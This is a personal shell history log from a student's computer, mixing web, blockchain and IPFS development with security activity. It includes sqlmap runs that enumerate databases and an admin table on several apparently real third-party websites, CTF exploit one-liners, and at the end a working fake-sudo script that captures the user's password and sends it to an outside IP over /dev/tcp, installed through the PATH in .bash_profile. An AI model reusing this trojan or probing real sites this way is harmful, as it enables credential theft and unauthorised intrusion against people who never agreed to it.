+: 1537622956:0;truffle migrate
+: 1537623020:0;ng generate service contracts
+: 1537623034:0;cd src
+: 1537623035:0;ls
+: 1537623042:0;cd app
+: 1537623044:0;ls
+: 1537623103:0;sublime src/app/contracts.service.ts
+: 1537623231:0;ls
+: 1537623243:0;sublime contracts.service.ts
+: 1537623285:0;sublime contracts.service.spec.ts
+: 1537623494:0;sublime contracts.service.specs.ts
+: 1537623584:0;ng generate service contracts
+: 1537623991:0;git add .
+: 1537624087:0;git commit -m "First commit with angular contract services."
+: 1537624095:0;git push
+: 1537627725:0;npm install truffle-contract
+: 1537627778:0;npm install --save truffle-contract
+: 1537627812:0;ng generate service contracts
+: 1537628184:0;cd ..
+: 1537628191:0;ng generate service contracts
+: 1537631302:0;ls
+: 1537631305:0;cd src
+: 1537631307:0;ls
+: 1537631310:0;cd app
+: 1537631311:0;ls
+: 1537631316:0;cd ..
+: 1537631317:0;ls
+: 1537631324:0;cd ..
+: 1537631324:0;ls
+: 1537631328:0;cd contracts
+: 1537631329:0;ls
+: 1537631352:0;sublime ConvertLib.sol
+: 1537631380:0;sublime MetaCoin.sol
+: 1537631389:0;cd ..
+: 1537631414:0;truffle compile && truffle migrate
+: 1537631459:0;ng generate service contracts
+: 1537633780:0;cd ..
+: 1537633786:0;git clone https://github.com/cryptoufm/qi-web-app.git
+: 1537633793:0;cd qi-web-app
+: 1537633812:0;rm -r src/environments 
+: 1537634286:0;git clone /Users/baroness/Documents/201802/CS044 Blockchain (A)
+: 1537634302:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)"
+: 1537634315:0;git clone https://github.com/cryptoufm/qi-web-app.git
+: 1537634321:0;cd qi-web-app
+: 1537634327:0;ng serve
+: 1537634333:0;npm start
+: 1537634345:0;npm install
+: 1537634483:0;git-flow init
+: 1537634519:0;git flow init
+: 1537634528:0;git status
+: 1537634538:0;git checkout .
+: 1537634540:0;git status
+: 1537634542:0;git flow init
+: 1537634554:0;ng serve
+: 1537634892:0;git pull
+: 1537635446:0;git status
+: 1537635450:0;git branch
+: 1537635458:0;git add .
+: 1537635472:0;git commit -m "Tsconfig.json edit."
+: 1537635475:0;git push
+: 1537636648:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/Copia de qi-web-app"
+: 1537636659:0;ng generate service contracts
+: 1537636670:0;npm install
+: 1537636712:0;ng serve
+: 1537636782:0;ng generate service contracts
+: 1537637915:0;ng generate -h
+: 1537637978:0;mkdir @contract
+: 1537638030:0;ng generate class @contract/qi-registry.ts
+: 1537638085:0;code .
+: 1537638592:0;cd ..
+: 1537638597:0;git clone https://github.com/SimpleICO/web-app.git
+: 1537638603:0;code .
+: 1537638768:0;ls
+: 1537638779:0;cd web-app
+: 1537638780:0;ls
+: 1537638792:0;. code
+: 1537638798:0;code .
+: 1537638966:0;cd ..
+: 1537638970:0;ls web-app
+: 1537638975:0;cd web-app
+: 1537638979:0;code .
+: 1537639043:0;cd ..
+: 1537639047:0;cd qi-web-app
+: 1537639050:0;git pull
+: 1537640348:0;git add .
+: 1537640366:0;git commit -m "Un montﾃｳn de mini cambios gg"
+: 1537640372:0;git push
+: 1537640574:0;ng generate class @contract/qi-registry.ts
+: 1537640618:0;ng generate class @contract/qi
+: 1537641303:0;git add .
+: 1537641308:0;git commit -m "Un montﾃｳn de mini cambios gg"
+: 1537641311:0;git push
+: 1537641859:0;cd ..
+: 1537641867:0;cd web-app
+: 1537641870:0;npm install
+: 1537642083:0;ng serve
+: 1537643570:0;cd && ls
+: 1537643581:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)"
+: 1537643582:0;ls
+: 1537643748:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/Hackathon/web-app"
+: 1537643834:0;npm install
+: 1537643898:0;ng serve
+: 1537643928:0;code .
+: 1537643954:0;ng serve
+: 1537644420:0;git flow init
+: 1537644428:0;git add .
+: 1537644439:0;git commit -m "Environments added."
+: 1537644442:0;git push
+: 1537644446:0;git flow init
+: 1537644454:0;git branch
+: 1537644790:0;git add .
+: 1537644810:0;git commit -m "Added contracts' abis."
+: 1537644815:0;git push
+: 1537644839:0;git push --set-upstream origin develop
+: 1537644884:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/Hackathon/"
+: 1537644891:0;git clone https://github.com/cryptoufm/web-app.git
+: 1537645022:0;cd web-app
+: 1537645030:0;git flow init
+: 1537645038:0;git branch
+: 1537645073:0;code .
+: 1537645341:0;ng generate class @contract/qi
+: 1537645366:0;ng generate class @contract/qi-registry
+: 1537645375:0;ng generate class @contract/collection-registry
+: 1537645380:0;ng generate class @contract/collection
+: 1537648397:0;git add .
+: 1537648413:0;git commit -m "Added TS contracts."
+: 1537648440:0;git push
+: 1537648476:0;cd "/Users/baroness/Documents/201802/CS044 Blockchain (A)/Hackathon/"
+: 1537648478:0;ls
+: 1537648497:0;git clone https://github.com/cryptoufm/qi-web-app.git
+: 1537648502:0;cd qi-web-app
+: 1537648506:0;code .
+: 1537648548:0;git flow init
+: 1537648555:0;git branch
+: 1537657233:0;git pull
+: 1537657252:0;git push origin master
+: 1537657277:0;git push origin develop:master
+: 1537765781:0;xmr-stak
+: 1537765784:0;ls
+: 1537765792:0;./xmr-stak
+: 1537765817:0;xmr-stak && cd bin && ./xmr-stak
+: 1537765828:0;cd bin && ./xmr-stak
+: 1537789527:0;cd xmr-stak && cd bin && ./xmr-stak
+: 1537789533:0;cd xmr-stak && cd bin
+: 1537789546:0;xmr-stak -h
+: 1537789550:0;./xmr-stak -h
+: 1537802922:0;./xmr-stak
+: 1537835588:0;./xmr-stak -h
+: 1537835607:0;./xmr-stak --poolconf
+: 1537836394:0;sublime pools.txt
+: 1537836556:0;./xmr-stak
+: 1537938793:0;xcode-select --install && brew upgrade && brew cleanup
+: 1537938808:0;xcode-select --update && brew upgrade && brew cleanup
+: 1537938821:0;software update && brew upgrade && brew cleanup
+: 1537938834:0;brew upgrade && brew cleanup
+: 1537939291:0;git lfs install && git lfs install --system
+: 1537939309:0;sudo git lfs install && sudo git lfs install --system
+: 1537939446:0;export LDFLAGS="-L/usr/local/opt/openssl/lib"
+: 1537939455:0;export CPPFLAGS="-I/usr/local/opt/openssl/include"
+: 1537939464:0;export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig"
+: 1537939562:0;brew link --overwrite --dry-run wireshark
+: 1537939583:0;brew cask install wireshark
+: 1537939645:0;fpath=(/usr/local/share/zsh-completions $fpath)
+: 1537939657:0;rm -f ~/.zcompdump; compinit
+: 1537939709:0;environment
+: 1537939714:0;vars
+: 1537939716:0;var
+: 1537942202:0;cd xmr-stak && cd bin && ./xmr-stak
+: 1537966715:0;./xmr-stak
+: 1538018031:0;xmr-stak && cd bin && ./xmr-stak
+: 1538029455:0;./xmr-stak
+: 1538115645:0;xmr-stak && cd bin && ./xmr-stak
+: 1538196452:0;cd Downloads && git init && git clone https://github.com/msterkel/text-analysis.git
+: 1538196472:0;cd text-analysis && sublime text_analysis.Rmd
+: 1538199043:0;xmr-stak && cd bin && ./xmr-stak
+: 1538371821:0;./xmr-stak
+: 1538455082:0;cd xmr-stak && cd bin && ./xmr-stak
+: 1538581748:0;brew cask install whatsapp
+: 1538584021:0;whatsapp
+: 1538584027:0;.whatsapp
+: 1538584030:0;open whatsapp
+: 1538584035:0;run whatsapp
+: 1538628929:0;cd xmr-stak && cd bin && ./xmr-stak
+: 1538681192:0;ping 10.200.36.243
+: 1538681253:0;hping 10.200.36.243
+: 1538681256:0;hping
+: 1538682319:0;nmap -A -p -v 10.200.36.243
+: 1538682337:0;nmap -A -p- -v 10.200.36.243
+: 1538682369:0;nmap -A -p- -v -Pn 10.200.36.243
+: 1538683721:0;brew install msfconsole
+: 1538683753:0;brew install metasploit
+: 1538692135:0;brew cask install mactex
+: 1538736190:0;cd xmr-stak && cd bin && ./xmr-stak
+: 1539065870:0;cd
+: 1539065872:0;cd xmr-stak && cd bin && ./xmr-stak
+: 1539104475:0;./xmr-stak
+: 1539113143:0;brew install sqlmap
+: 1539113212:0;brew cask install owasp-zap
+: 1539113989:0;python sqlmap.py --wizard
+: 1539113996:0;sqlmap
+: 1539114431:0;python sqlmap --wizard
+: 1539114443:0;sqlmap --wizard
+: 1539115404:0;sqlmap --wizard http://testphp.vulnweb.com/guestbook.php --dbs
+: 1539115422:0;sqlmap --wizard http://testphp.vulnweb.com/guestbook.php
+: 1539115561:0;sqlmap --wizard
+: 1539115702:0;y
+: 1539115703:0;Y
+: 1539115897:0;sqlmap --wizard
+: 1539307186:0;ipconfig
+: 1539307192:0;ifconfig
+: 1539314111:0;sqlmap --wizard
+: 1539314194:0;sqlmap -u https://mykimpo.com/index.php\?route\=product/search\&search\=njhn\&description\=true 
+: 1539322294:0;sqlmap -u http://sanjavier.es/contenidos.php\?id\=25%27
+: 1539323124:0;sqlmap --wizard
+: 1539323211:0;sqlmap -u http://sanjavier.es/contenidos.php\?id\=25%27 --risk 3
+: 1539365648:0;sqlmap -u http://www.atrium.com.pk/404.php?id=4 --risk=3 
+: 1539365692:0;sqlmap -u http://www.atrium.com.pk/404.php\?id\=4
+: 1539365767:0;sqlmap -u http://www.atrium.com.pk/404.php?id=4 --level=3 --risk=3
+: 1539367086:0;sqlmap -u http://b2b.semipia.com/view_items.php?id=34 --dbs
+: 1539367144:0;sqlmap.py -u http://b2b.semipia.com/view_items.php?id=34 --dbs
+: 1539367156:0;sqlmap -u http://b2b.semipia.com/view_items.php?id=34 --dbs
+: 1539367161:0;sqlmap
+: 1539367177:0;sqlmap -hh
+: 1539367262:0;sqlmap -u "http://b2b.semipia.com/view_items.php?id=34" --dbs
+: 1539367701:0;sqlmap -u "http://b2b.semipia.com/view_items.php?id=34" -D semikron --tables
+: 1539370219:0;sqlmap -u "http://b2b.semipia.com/view_items.php?id=34" -D semikron --tables --no-cast
+: 1539370281:0;sqlmap -u "http://www.sriannapurna.com/product-list.php\?id\=5" --dbs
+: 1539370355:0;sqlmap -u "http://www.sriannapurna.com/product-list.php?id=5" --dbs
+: 1539370800:0;sqlmap -u "http://b2b.semipia.com/view_items.php?id=34" -D semikron -T admin --columns
+: 1539370867:0;sqlmap -u "http://www.sriannapurna.com/product-list.php?id=5" -D information_schema --tables
+: 1539380134:0;sqlmap -u "http://www.sriannapurna.com/product-list.php?id=5" -D information_schema -T USER_PRIVILAGES --columns
+: 1539385269:0;sqlmap -u "http://www.sriannapurna.com/product-list.php?id=5" -D information_schema -T COLUMN_PRIVILAGES --columns
+: 1539719916:0;sqlmap -u http://www.xrayrisk.com/calculator/calculator-normal-studies.php\?id\=1 --dbs
+: 1539719977:0;sqlmap -u "http://www.xrayrisk.com/calculator/calculator-normal-studies.php\?id\=1" --dbs
+: 1539720098:0;sqlmap -u "http://www.xrayrisk.com/calculator/calculator-normal-studies.php?id=1" --dbs
+: 1539720776:0;brew install nikto
+: 1539720826:0;brew update
+: 1539720832:0;brew install nikto
+: 1539720982:0;xcode-select --install
+: 1539722478:0;brew install nikto
+: 1539800161:0;sqlmap -u "http://www.xrayrisk.com/calculator/calculator-normal-studies.php?id=1" --dbs
+: 1539842825:0;sqlmap -u "http://www.xrayrisk.com/calculator/calculator-normal-studies.php?id=1" --dbs --no-cast
+: 1539891667:0;sublime "Users/baroness/Downloads/clickjacked.html"
+: 1539891682:0;sublime Users/baroness/Downloads/clickjacked.html
+: 1540332202:0;cd /Users/baroness/Documents/201802/Joconianos
+: 1540332207:0;git init
+: 1540332220:0;git clone https://github.com/joconianos/altavoz.git
+: 1540332227:0;ls
+: 1540332231:0;cd altavoz
+: 1540332238:0;ls
+: 1540332243:0;tree
+: 1540332282:0;cd src
+: 1540332283:0;ls
+: 1540418011:0;brew cask install gitkraken
+: 1540422213:0;brew cask install telegram
+: 1540424528:0;cd /Users/baroness/Documents/201802/Joconianos
+: 1540424531:0;cd altavoz
+: 1540424533:0;ls
+: 1540424545:0;sublime README.md
+: 1540424562:0;git add .
+: 1540424571:0;git commit -m "ggg prueba"
+: 1540424576:0;git push
+: 1540424954:0;cd ..
+: 1540424962:0;rm -r altavoz
+: 1540424972:0;y
+: 1540424976:0;rm -r altavoz
+: 1540424980:0;ls
+: 1540424983:0;git init
+: 1540424986:0;git clone https://armi3@bitbucket.org/fabrv/altavoz.git
+: 1540425036:0;cd altavoz/
+: 1540425038:0;ls
+: 1540495415:0;ssh random@pwnable.kr -p2222 (pw:guest)
+: 1540495427:0;ssh random@pwnable.kr -p2222
+: 1540495949:0;nc pwnable.kr 9009
+: 1540495964:0;nc
+: 1540495969:0;nc pwnable.kr 9009
+: 1540496033:0;ssh fd@pwnable.kr -p2222
+: 1540496264:0;ssh random@pwnable.kr -p2222
+: 1540496366:0;nc pwnable.kr -9009
+: 1540496377:0;nc pwnable.kr -p 9009
+: 1540496381:0;nc pwnable.kr 9009
+: 1540496461:0;nc pwnable.kr 9000
+: 1540496653:0;apt-get install libc6-i386
+: 1540496663:0;brew install libc6-i386
+: 1540498512:0;(python -c "print 'A'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+: 1540523412:0;ssh fd@pwnable.kr -p2222
+: 1540523512:0;clang --version
+: 1540523625:0;ls
+: 1540524032:0;ssh fd@pwnable.kr -p2222
+: 1540524863:0;ssh col@pwnable.kr -p2222
+: 1540526302:0;killall ssh
+: 1540526307:0;killall .ssh
+: 1540526315:0;kill ssh
+: 1540526320:0;killall
+: 1540526330:0;ssh col@pwnable.kr -p2222
+: 1540526363:0;sudo netstat -tnlp tcp | grep '\.80 '
+: 1540526633:0;ssh col@pwnable.kr -p2222
+: 1540526636:0;ssh col@pwnable.kr -p 2222
+: 1540526640:0;ssh col@pwnable.kr -p 2221
+: 1540526648:0;ssh col@pwnable.kr -p 2222
+: 1540526731:0;cd /Users/baroness/Downloads/flag
+: 1540526734:0;cd /Users/baroness/Downloads/
+: 1540526759:0;cat flag
+: 1540526778:0;ssh col@pwnable.kr -p2222 (pw:guest)
+: 1540526783:0;ssh col@pwnable.kr -p2222
+: 1540526825:0;sudo service ssh restart
+: 1540526833:0;ssh restar
+: 1540526840:0;ssh restart
+: 1540526847:0;ssh -h
+: 1540526860:0;ssh col@pwnable.kr -p 2222
+: 1540527373:0;dig pwnable.kr
+: 1540527410:0;ping pwnable.kr
+: 1540527418:0;curl google.com
+: 1540527427:0;ssh col@pwnable.kr -p 2222
+: 1540527461:0;for i in `ps aux | grep ssh | grep -v grep | awk {'print $2'}` ; do kill $i; done
+: 1540527465:0;ssh col@pwnable.kr -p 2222
+: 1540528085:0;cd /Users/baroness/Downloads/
+: 1540528089:0;strings flag
+: 1540528113:0;brew install upx
+: 1540528328:0;upx
+: 1540528350:0;upx -o flag
+: 1540528391:0;upx -d flag -o decompressed
+: 1540528431:0;gdb decompressed
+: 1540528444:0;brew install gdb
+: 1540528632:0;gdb decompressed
+: 1540528758:0;echo "set startup-with-shell off" >> ~/.gdbinit
+: 1540528779:0;gdb decompressed
+: 1540529034:0;gdb
+: 1540529046:0;gdbcert
+: 1540529492:0;killall taskgated
+: 1540529787:0;codesign -fs gdbc /usr/local/bin/gdb
+: 1540610341:0;brew install ionic
+: 1540610422:0;npm install -g ionic cordova
+: 1540611394:0;tar xvfz go-ipfs.tar.gz
+: 1540611399:0;cd go-ipfs
+: 1540611413:0;cd /Users/baroness/Downloads/go-ipfs
+: 1540611424:0;./install.sh
+: 1540611432:0;ipfs help
+: 1540611783:0;ipfs id
+: 1540611835:0;ipfs init
+: 1540611845:0;ipfs id
+: 1540612631:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/readme
+: 1540612673:0;ipfs daemon
+: 1540612722:0;ipfs cat /ipfs/QmPXME1oRtoT627YKaDPDQ3PwA8tdP9rWuAAweLzqSwAWT/readme
+: 1540612732:0;ipfs daemon && ipfs cat /ipfs/QmPXME1oRtoT627YKaDPDQ3PwA8tdP9rWuAAweLzqSwAWT/readme
+: 1540613032:0;ipfs cat /ipfs/QmPXME1oRtoT627YKaDPDQ3PwA8tdP9rWuAAweLzqSwAWT/readme
+: 1540613153:0;ipfs init
+: 1540613160:0;ipfs cat /ipfs/QmPXME1oRtoT627YKaDPDQ3PwA8tdP9rWuAAweLzqSwAWT/readme
+: 1540613164:0;ipfs --init
+: 1540613170:0;ipfs init --init
+: 1540613173:0;ipfs -h
+: 1540613210:0;ipfs stats
+: 1540613222:0;export IPFS_PATH=/path/to/ipfsrepo
+: 1540613227:0;ipfs init
+: 1540613287:0;./install.sh
+: 1540613291:0;cd /Users/baroness/Downloads/go-ipfs
+: 1540613292:0;./install.sh
+: 1540613302:0;sudo ./install.sh
+: 1540613329:0;export IPFS_PATH=/usr/local/bin
+: 1540613334:0;export IPFS_PATH=/usr/bin
+: 1540613338:0;export IPFS_PATH=/usr/local/bin
+: 1540613341:0;sudo ./install.sh
+: 1540613347:0;ipfs init
+: 1540613356:0;ipfs cat /ipfs/QmS4ustL54uo8FzR9455qaxZwuMiUhyvMcX9Ba8nUH4uVv/readme
+: 1540613386:0;./quick-start
+: 1540613391:0;ls
+: 1540617791:0;ipfs -h
+: 1540617839:0;git clone https://armi3@bitbucket.org/fabrv/aaaltavoz.git
+: 1540617912:0;ls
+: 1540617921:0;ipfs add -r aaaltavoz
+: 1540617957:0;ipfs stat
+: 1540617962:0;ipfs stats
+: 1540618065:0;cd aaaltavoz
+: 1540618069:0;ionic build
+: 1540618533:0;ipfs add -r aaaltavoz
+: 1540618536:0;cd
+: 1540618539:0;ipfs add -r aaaltavoz
+: 1540618598:0;ionic build --production
+: 1540618606:0;cd aaaltavoz
+: 1540618607:0;ionic build --production
+: 1540618643:0;cd aaaltavoz
+: 1540618644:0;ls
+: 1540618650:0;cd src
+: 1540618651:0;ls
+: 1540618665:0;cd ..
+: 1540618666:0;ls
+: 1540618679:0;ls www
+: 1540618689:0;ls build
+: 1540618694:0;ls www/build
+: 1540618702:0;ls www/assets
+: 1540618711:0;ipfs add -r www
+: 1540658562:0;ipfs cat QmUnnyJyYXiEXZ8eJ21ktzpyRdPhJ1918GmE2JGCmx815D
+: 1540658598:0;ipfs init
+: 1540658608:0;ipfs daemon
+: 1540658620:0;Error: merkledag: not found
+: 1540658625:0;ipfs cat QmUnnyJyYXiEXZ8eJ21ktzpyRdPhJ1918GmE2JGCmx815D
+: 1540659102:0;ipfs pin ls
+: 1540659212:0;ipfs init --empty-repo
+: 1540659289:0;ipfs daemon&
+: 1540659296:0;ipfs cat QmUnnyJyYXiEXZ8eJ21ktzpyRdPhJ1918GmE2JGCmx815D
+: 1540659348:0;sublime ~/.ipfs/config\
+\
+
+: 1540659422:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/readme
+: 1540661629:0;brew install ipfs
+: 1540664063:0;brew services start ipfs
+: 1540664087:0;rm '/usr/local/bin/ipfs'
+: 1540664097:0;brew link --overwrite ipfs
+: 1540664109:0;brew link --overwrite --dry-run ipfs
+: 1540664223:0;brew unlink ipfs && brew link ipfs
+: 1540664438:0;brew services start ipfs
+: 1540667942:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/readme
+: 1540667983:0;ipfs add -r www
+: 1540680538:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/readme
+: 1540680543:0;brew services start ipfs
+: 1540680554:0;brew services restart ipfs
+: 1540680561:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/readme
+: 1540680584:0;brew services restart ipfs
+: 1540680594:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/readme
+: 1540680605:0;killall ipfs
+: 1540680608:0;brew services restart ipfs
+: 1540680617:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/readme
+: 1540680635:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/quick-start
+: 1540696768:0;ipfs stas
+: 1540696771:0;ipfs stats
+: 1540696844:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/quick-start
+: 1540696866:0;brew services restart ipfs
+: 1540696885:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/quick-start
+: 1540697004:0;ipfs init
+: 1540697008:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/quick-start
+: 1540697026:0;brew services restart ipfs
+: 1540697046:0;ipfs cat /ipfs/QmYwAPJzv5CZsnA625s3Xf2nemtYgPpHdWEz79ojWnPbdG/quick-start
+: 1540697103:0;ipfs swarm peers
+: 1540697117:0;ipfs daemon
+: 1540697261:0;htop
+: 1540697270:0;nc
+: 1540697396:0;nmap -h
+: 1540697420:0;nmap
+: 1540697735:0;nmap localhost
+: 1540697808:0;sudo lsof -i tcp:5001
+: 1540697824:0;brew services restart ipfs
+: 1540698024:0;ipfs cat /ipfs/QmS4ustL54uo8FzR9455qaxZwuMiUhyvMcX9Ba8nUH4uVv/readme
+: 1540698030:0;cd
+: 1540698036:0;cd aaaltavoz/src
+: 1540698038:0;ls
+: 1540698055:0;cd ..
+: 1540698055:0;ls
+: 1540698067:0;ipfs -r www
+: 1540698073:0;ipfs add -r www
+: 1540699479:0;ipfs pin add -r /ipfs/QmQ2CqPEe4SpCFaqSMzHrLWh8jCspVm1xsbJnhwPj1Pfew
+: 1540701816:0;ipfs name publish QmQ2CqPEe4SpCFaqSMzHrLWh8jCspVm1xsbJnhwPj1Pfew
+: 1540701838:0;ipfs name resolve QmUsMWQ5NKYkLTESeoHmWagDUf94yvdpGdY7Aj9ix7AnEc
+: 1540701881:0;ipfs pin add -r /ipns/QmUsMWQ5NKYkLTESeoHmWagDUf94yvdpGdY7Aj9ix7AnEc
+: 1540701924:0;ipfs pin add -r /ipns/QmQ2CqPEe4SpCFaqSMzHrLWh8jCspVm1xsbJnhwPj1Pfew
+: 1540715587:0;git pull
+: 1540715619:0;ls
+: 1540715620:0;cd
+: 1540715623:0;ls
+: 1540715628:0;git clone https://armi3@bitbucket.org/fabrv/aaaltavoz.git
+: 1540715756:0;ionic build --production
+: 1540715761:0;cd aaaltavoz
+: 1540715766:0;ionic build --production
+: 1540715830:0;npm audit fix
+: 1540715853:0;git add .
+: 1540715867:0;git commit -m "Preparaciﾃｳn de ambiente de producciﾃｳn."
+: 1540715871:0;git push
+: 1540715881:0;ionic build --production
+: 1540715985:0;ipfs add -r www
+: 1540846866:0;ssh passcode@pwnable.kr -p2222
+: 1540855559:0;ssh random@pwnable.kr -p2222 (pw:guest)
+: 1540855563:0;ssh random@pwnable.kr -p2222 
+: 1540857735:0;ssh random@pwnable.kr -p2222
+: 1540858150:0;ssh input@pwnable.kr -p2222
+: 1540858185:0;ssh input2@pwnable.kr -p2222
+: 1540858877:0;ssh mistake@pwnable.kr -p2222
+: 1540859016:0;ssh shellchock@pwnable.kr -p2222
+: 1540859056:0;ssh shellshock@pwnable.kr -p2222
+: 1540863364:0;ssh col@pwnable.kr -p2222 
+: 1541442833:0;brew cask install eclipse
+: 1541443395:0;brew install java
+: 1542006343:0;cd xmr-stak && cd bin && ./xmr-stak
+: 1542157126:0;brew cask install scribus
+: 1542178987:0;cd "/Users/baroness/Documents/201802/M114 Matemaﾌ》ica discreta (B)/Proyecto final"
+: 1542178996:0;python rsaexample.py
+: 1542209952:0;java rsaexample.java
+: 1542211998:0;python rsa101.py
+: 1542212163:0;brew install figlet
+: 1542216353:0;figlet
+: 1542216363:0;figlet -h
+: 1542216368:0;figlet -help
+: 1542216384:0;figlet h
+: 1542216391:0;figlet -h
+: 1542216408:0;figlet -I
+: 1542216415:0;figlet -I jjjj
+: 1542216473:0;figlet -w 40 rsa101
+: 1542216481:0;figlet -w 40 RSA101
+: 1542216491:0;figlet -w 40 --RSA101--
+: 1542216496:0;figlet -w 40 "--RSA101--"
+: 1542216506:0;figlet -w 40 ...RSA101
+: 1542216513:0;figlet -w 40 RSA101
+: 1542216565:0;figlet -w 40 R S A 1 0 1
+: 1542216576:0;figlet -w 40 R S A 101
+: 1542216583:0;figlet -w 40 RSA 101
+: 1542264292:0;git clone https://github.com/armi3/RSA101.git
+: 1542264298:0;ls
+: 1542264306:0;cd rsa101
+: 1542264311:0;ls
+: 1542264322:0;finder
+: 1542264429:0;git add .
+: 1542264458:0;git commit -m "MVP"
+: 1542264463:0;git push
+: 1542264632:0;git add . && git commit -m "" && git push
+: 1542302355:0;git add . && git commit -m "Bug fixing." && git push
+: 1542310749:0;python rsa101.py
+: 1542332347:0;cd ..
+: 1542332357:0;python rsaexample2.py
+: 1542412557:0;cd "/Users/baroness/Documents/201802/M114 Matemaﾌ》ica discreta (B)/Proyecto final/RSA101"
+: 1542412568:0;git add .
+: 1542412613:0;git commit -m "Major bug with private exponent fixed."
+: 1542412616:0;git push
+: 1542412659:0;git pull
+: 1542412721:0;git add . && git commit -m "Major bug with private key fixed." && git push
+: 1542412730:0;git add .
+: 1542412739:0;git commit -m "Major bug with private key fixed."
+: 1542412745:0;git push
+: 1542501403:0;ls -a
+: 1542501419:0;echo .DS_Store  >> .gitignore
+: 1542501449:0;echo .project  >> .gitignore
+: 1542501461:0;echo .pydevproject  >> .gitignore
+: 1542501488:0;git rm --cached .DS_Store
+: 1542501497:0;git rm --cached .project
+: 1542501507:0;git rm --cached .pydevproject
+: 1542501517:0;git rm --cached .DS_Store
+: 1542501566:0;ls -la
+: 1542501583:0;cd modules
+: 1542501584:0;ls -la
+: 1542501603:0;echo assets.pyc  >> .gitignore
+: 1542501635:0;echo assets2.pyc  >> .gitignore
+: 1542501647:0;git rm --cached assets.pyc
+: 1542501654:0;git rm --cached assets2.pyc
+: 1542501657:0;cd ..
+: 1542501663:0;git add .
+: 1542501678:0;git commit -m "Git ignore updated."
+: 1542501682:0;git push
+: 1542501782:0;sublime .gitignore
+: 1542502434:0;ls
+: 1542502439:0;cd modules
+: 1542502445:0;ls
+: 1542502449:0;ls -la
+: 1542502457:0;rm .gitignore
+: 1542502460:0;ls -la
+: 1542510268:0;cd ..
+: 1542510302:0;git add . && git commit -m "File reading and writing." && git push
+: 1542511035:0;git pull
+: 1542580981:0;brew cask install etcher
+: 1542585392:0;ssh pi@raspberrypi
+: 1542585781:0;ifconfig
+: 1542585799:0;ssh pi@192.168.0.03
+: 1542585832:0;ssh pi@192.168.0.3
+: 1542587752:0;nmap
+: 1542587791:0;nmap v
+: 1542587805:0;nmap A
+: 1542587822:0;nmap localhost
+: 1542587847:0;nmap -A -p
+: 1542587854:0;nmap -h
+: 1542587884:0;ping 192.168.0.3
+: 1542650597:0;ssh pi@192.168.0.3
+: 1542653107:0;mosh
+: 1542653134:0;mosh pi@192.168.0.3
+: 1542671178:0;/Volumes/EOS_DIGITAL/Android ; exit;
+: 1542672553:0;ssh melchior@159.65.139.210
+: 1542674080:0;ssh balthasar@159.65.139.210
+: 1542677121:0;kill ssh
+: 1542677126:0;kill all ssh
+: 1542677131:0;.killall ssh
+: 1542677158:0;for i in `ps aux | grep ssh | grep -v grep | awk {'print $2'}` ; do kill $i; done
+: 1542677188:0;mosh balthasar@159.65.139.210
+: 1542677526:0;mosh melchior@159.65.139.210
+: 1542745564:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/Proyecto final"
+: 1542745609:0;ls
+: 1542745614:0;java -jar encoder.jar
+: 1542746108:0;sublime texttospeech.txt
+: 1542746155:0;java -jar encoder.jar -i texttospeech.txt -o /Volumes/NO NAME/inject.bin
+: 1542746659:0;java -jar encoder.jar -i texttospeech.txt -o "/Volumes/NO NAME/inject.bin"
+: 1542746748:0;say "hola"
+: 1542746774:0;say ﾂｴyou have been hackedﾂｴ
+: 1542747540:0;cd ~/.config/sudo
+: 1542761697:0;ifconfig
+: 1542763838:0;mosh melchior@159.65.139.210
+: 1542764661:0;mosh melchior@fer.codes
+: 1542764900:0;sudo ufw status verbose
+: 1542765373:0;cd "/Users/baroness/Documents/201802/CS029 Seguridad informaﾌ》ica & Encriptacioﾌ］ (A)/Proyecto final"
+: 1542765377:0;ls
+: 1542765457:0;java -jar encoder.jar -i backdoor.txt -o "/Volumes/NO NAME/inject.bin"
+: 1542775587:0;sudo fdesetup -h
+: 1542775597:0;sudo fdesetup help
+: 1542777255:0;sudo fdesetup status
+: 1542777264:0;fdesetup status
+: 1542777271:0;sudo fdesetup status
+: 1542778116:0;rm -rf ~/.config/sudo
+: 1542778131:0;mkdir -p ~/.config/sudo
+: 1542778150:0;echo '#!'$SHELL > ~/.config/sudo/sudo
+: 1542778162:0;/usr/bin/sudo -n true 2>/dev/null
+: 1542778440:0;if [ $? -eq 0 ]\
+then\
+/usr/bin/sudo $@\
+else\
+echo -n "[sudo] password for $USER: "\
+read -s pwd\
+echo\
+echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null\
+if [ $? -eq 1 ]\
+then\
+echo "$USER:$pwd:invalid" > /dev/tcp/159.65.139.210/1337\
+echo "Sorry, try again."\
+sudo $@\
+else\
+echo "$USER:$pwd:valid" > /dev/tcp/159.65.139.210/1337\
+echo "$pwd" | /usr/bin/sudo -S $@\
+fi\
+fi' > ~/.config/sudo/sudo\
+chmod u+x ~/.config/sudo/sudo\
+echo "export PATH=~/.config/sudo:$PATH" >> ~/.bash_profile\
